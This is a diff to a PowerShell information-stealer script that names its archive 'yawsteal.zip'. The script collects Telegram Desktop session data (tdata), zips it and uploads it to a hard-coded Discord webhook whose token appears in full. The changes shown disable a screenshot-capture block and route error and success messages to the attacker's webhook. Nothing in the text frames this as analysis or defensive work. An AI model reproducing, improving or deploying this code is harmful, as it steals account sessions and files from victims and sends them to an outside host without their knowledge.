@@ -19,7 +19,7 @@ $temp = $env:TEMP
 $Webhook_link = "https://discord.com/api/webhooks/1318960558984396961/n9-ClVxK_sS0oXOgAdK8vC7uCrPqZFLijw2VFv4A29crBHti22BTmgyZ6buqQckIFkqk"
 $debug_webhook_link = "https://discord.com/api/webhooks/1318960558984396961/n9-ClVxK_sS0oXOgAdK8vC7uCrPqZFLijw2VFv4A29crBHti22BTmgyZ6buqQckIFkqk"
 $zipFilePath = Join-Path $env:Temp "yawsteal.zip"
-    
+
 if($userName -eq "andro") {
     $scriptPath = "C:\Users\andro\OneDrive\Рабочий стол\test.ps1"
 
@@ -252,20 +252,20 @@ $totalPath = Join-Path -Path $tempFolder -ChildPath $totalName
 New-Item -ItemType File -Path $totalPath | Out-Null
 
 ### --- // Process \\ --- ###
-$outputPath = "$tempFolder\Screenshot.jpg"
+#$outputPath = "$tempFolder\Screenshot.jpg"
 
-Add-Type -AssemblyName System.Drawing
+#Add-Type -AssemblyName System.Drawing
 
-$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
-$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
-$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
+#$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
+#$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+#$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
 
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+#$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+#$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
 
-$bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+#$bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
 
-$graphics.Dispose()
+#$graphics.Dispose()
 
 ## --- // TELEGRAM | TDATA \\ --- ##
 $tdata = "$roaming\Telegram Desktop\tdata"
@@ -382,10 +382,11 @@ if($userName -eq "andro") {
         $response = $httpClient.PostAsync($Webhook_link, $formData).Result
 
         if (-Not $response.IsSuccessStatusCode) {
-            Write-Error "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
+            Send-Webhook -Text "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
         }
+        Send-Webhook -Text "ZIP sended!"
     } catch {
-        Write-Error "Error sending ZIP archive: $_"
+        Send-Webhook -Text "Error sending ZIP archive: $_"
     }
 }
 
